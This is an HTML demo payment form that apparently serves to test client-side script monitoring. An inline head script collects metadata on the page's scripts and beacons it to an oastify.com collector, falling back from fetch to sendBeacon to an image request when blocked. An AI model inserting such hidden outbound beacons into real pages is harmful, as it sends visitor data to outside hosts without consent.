<!DOCTYPE html>
<html lang="en">
<head>
    <script>
const scriptMeta = new Map();

function captureScript(node) {
  if (node.nodeName === 'SCRIPT' && node.src) {
    scriptMeta.set(node.src, {
      url: node.src,
      integrity: node.getAttribute('integrity') || null,
      crossorigin: node.getAttribute('crossorigin') || null
    });
  }
}

// Grab what's already in DOM
document.querySelectorAll('script[src]').forEach(s => captureScript(s));

// Watch for anything injected later
new MutationObserver(mutations => {
  mutations.forEach(m => {
    m.addedNodes.forEach(node => captureScript(node));
  });
}).observe(document.documentElement, { childList: true, subtree: true });

// Beacon after page fully loads
window.addEventListener('load', () => {
  const payload = JSON.stringify({
    page: window.location.href,
    scripts: [...scriptMeta.values()],
    ts: Date.now()
  });

  // Primary: fetch with explicit JSON content-type (respects connect-src)
  fetch('https://0nokywbevarydes1ipi5qw1vvm1dp3ds.oastify.com/collect', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: payload,
    keepalive: true  // same as sendBeacon — survives page navigation
  }).catch(() => {
    // Fallback 1: sendBeacon if fetch is blocked
    const sent = navigator.sendBeacon(
      'https://0nokywbevarydes1ipi5qw1vvm1dp3ds.oastify.com/collect',
      payload
    );

    // Fallback 2: image beacon for DNS confirmation if both blocked
    if (!sent) {
      new Image().src = `https://0nokywbevarydes1ipi5qw1vvm1dp3ds.oastify.com/collect?d=${encodeURIComponent(payload)}`;
    }
  });
});     
    </script>
    <meta charset="UTF-8">
    <title>Payment Page</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container">
        <h2>Payment Page</h2>
        <button id="darkModeToggle">Toggle Dark Mode</button>
        <button id="resetForm">Reset Form</button>
        <form id="paymentForm">
            <div>
                <label for="cardNumber">Card Number:</label>
                <input type="text" id="cardNumber" name="cardNumber" placeholder="1234 5678 9012 3456" required>
                <div class="error" id="cardNumberError">Invalid card number (must be 16 digits).</div>
            </div>
            <div>
                <label for="expiryDate">Expiration Date:</label>
                <input type="text" id="expiryDate" name="expiryDate" placeholder="MM/YY" required>
                <div class="error" id="expiryDateError">Invalid expiration date (must be MM/YY and a future date).</div>
            </div>
            <div>
                <label for="cvv">CVV:</label>
                <input type="text" id="cvv" name="cvv" placeholder="123" required>
                <div class="error" id="cvvError">Invalid CVV (must be 3 or 4 digits).</div>
            </div>
            <div>
                <label for="name">Name on Card:</label>
                <input type="text" id="name" name="name" placeholder="John Doe" required>
                <div class="error" id="nameError">Invalid name (must contain only alphabetic characters).</div>
            </div>
            <button type="submit">Submit Payment</button>
        </form>
        <div id="successMessage" class="success">Payment successful!</div>
    </div>

    <script src="https://proxy.cside.dev/https://linnmaungthant.github.io/script.js"></script>
    <script src="https://proxy.cside.dev/https://linnmaungthant.github.io/darkMode.js"></script>
    <script src="https://proxy.cside.dev/https://linnmaungthant.github.io/formReset.js"></script>
    <script src="https://proxy.cside.dev/https://linnmaungthant.github.io/inputMasking.js"></script>
</body>
</html>
